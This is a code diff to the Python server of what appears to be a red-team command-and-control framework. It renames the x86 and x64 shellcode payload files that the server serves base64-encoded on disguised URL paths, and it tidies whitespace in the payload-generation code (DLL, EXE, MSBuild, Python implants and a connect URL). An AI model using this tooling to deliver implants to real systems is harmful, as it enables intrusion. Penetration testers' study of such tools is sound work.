@@ -84,7 +84,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.wfile.write(content)
 
         elif ("%spotal" % QuickCommandURI) in s.path:
-          filename = "%sSharp-shellcode_x86.bin" % (PayloadsDirectory)
+          filename = "%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory)
           with open(filename, 'rb') as f:
             content = f.read()
           content = base64.b64encode(content)
@@ -94,7 +94,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.wfile.write(content)
 
         elif ("%slogin" % QuickCommandURI) in s.path:
-          filename = "%sSharp-shellcode_x64.bin" % (PayloadsDirectory)
+          filename = "%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory)
           with open(filename, 'rb') as f:
             content = f.read()
           content = base64.b64encode(content)
@@ -403,7 +403,7 @@ if __name__ == '__main__':
         C2 = get_c2server_all()
         newPayload = Payloads(C2[5], C2[2], HostnameIP, C2[3], C2[8], C2[12],
         C2[13], C2[11], "", "", C2[19], C2[20],C2[21], get_newimplanturl(), PayloadsDirectory)
-        new_urldetails( "updated_host", HostnameIP, C2[3], "", "", "", "" )
+        new_urldetails("updated_host", HostnameIP, C2[3], "", "", "", "")
         update_item("HostnameIP", "C2Server", HostnameIP)
         update_item("QuickCommand", "C2Server", QuickCommand)
         newPayload.CreateRaw()
@@ -416,7 +416,7 @@ if __name__ == '__main__':
         newPayload.CreateEXE()
         newPayload.CreateMsbuild()
         newPayload.CreatePython()
-        newPayload.WriteQuickstart( ROOTDIR + 'quickstart.txt' )
+        newPayload.WriteQuickstart(ROOTDIR + 'quickstart.txt')
 
     else:
       print ("Initializing new project folder and database" + Colours.GREEN)
@@ -451,7 +451,7 @@ if __name__ == '__main__':
         C2[13], C2[11], "", "", C2[19], C2[20],
         C2[21], get_newimplanturl(), PayloadsDirectory)
 
-      new_urldetails( "default", C2[1], C2[3], "", "", "", "" )
+      new_urldetails("default", C2[1], C2[3], "", "", "", "")
       newPayload.CreateRaw()
       newPayload.CreateDlls()
       newPayload.CreateShellcode()
@@ -464,7 +464,7 @@ if __name__ == '__main__':
 
       create_self_signed_cert(ROOTDIR)
       newPayload.CreatePython()
-      newPayload.WriteQuickstart( directory + '/quickstart.txt' )
+      newPayload.WriteQuickstart(directory + '/quickstart.txt')
 
     print ("")
     print ("CONNECT URL: "+select_item("HostnameIP", "C2Server")+get_newimplanturl() + Colours.GREEN)
